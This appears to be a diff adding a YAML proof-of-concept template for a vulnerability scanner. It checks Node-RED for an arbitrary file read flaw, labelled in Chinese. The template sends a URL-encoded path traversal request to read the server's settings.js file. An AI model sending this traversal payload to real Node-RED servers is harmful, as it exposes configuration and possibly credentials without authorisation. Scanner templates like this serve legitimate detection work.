@@ -1,0 +1,17 @@
+id: poc-yaml-node-red-arbitrary-file-read
+info:
+  name: Node-RED 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Node-RED
+  osprey-id: vb_2021_0052
+requests:
+- method: GET
+  path: /ui_base/js/..%2f..%2f..%2f..%2fsettings.js
+  expression: 'status_code == 200 && contains(body, "To password protect the Node-RED
+    editor and admin API, the following")
+
+    '
+variables: {}
+transport: http
